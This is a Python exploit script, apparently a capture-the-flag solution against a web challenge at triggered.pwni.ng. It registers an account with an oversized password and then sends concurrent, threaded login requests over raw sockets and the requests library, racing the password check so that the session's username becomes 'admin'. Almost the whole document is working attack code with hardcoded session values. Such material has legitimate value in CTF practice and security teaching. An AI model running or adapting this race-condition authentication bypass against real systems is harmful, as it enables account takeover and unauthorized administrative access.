from pwn import *
from requests import post, get
import thread
import time
import os

url = 'http://triggered.pwni.ng:52856/register'
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
data = {'username': 'juno1234xx'+os.urandom(3).encode('hex')}
data['password'] = 'A'*4096*2
data['confirm-password'] = data['password']
c = post(url=url, data=data, headers=headers)
print c.history
print c.content

print '-------------------------'
time.sleep(1)

r1 = remote('triggered.pwni.ng', 52856)
r2 = remote('triggered.pwni.ng', 52856)

session = 'f4bf90e2-e6a7-4980-80e4-a9559adf3380'

def go1():
    global session, r1, data
    r1.sendline('''POST /login HTTP/1.1
Host: localhost:1234
Connection: keep-alive
Content-Length: {length}
Cache-Control: max-age=0
Cookie: session={session}
Origin: http://triggered.pwni.ng:52856
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://triggered.pwni.ng:52856/login
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7

username={username}'''.replace('\n', '\r\n').format(session=session, username=data['username'], length=len('username=')+len(data['username'])))


def go2():
    global session, r2, data
    import requests

    cookies = {
        'session': session,
    }

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://triggered.pwni.ng:52856',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Referer': 'http://triggered.pwni.ng:52856/login',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    data = {
      'username': 'admin'
    }

    time.sleep(0.3)
    response = requests.post('http://triggered.pwni.ng:52856/login', headers=headers, cookies=cookies, data=data)
    print 'admin-response', response.content, response.history
    print '-----------------'


go1()
r1.interactive()


import requests

cookies = {
    'session': session,
}

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Origin': 'http://triggered.pwni.ng:52856',
    'Upgrade-Insecure-Requests': '1',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Referer': 'http://triggered.pwni.ng:52856/login/password',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
}

data = {
  'password': data['password']
}

thread.start_new_thread(go2, ())
response = requests.post('http://triggered.pwni.ng:52856/login/password', headers=headers, cookies=cookies, data=data)

print response.history
print response.content

# thread.start_new_thread(go3, ())

# r2.interactive()
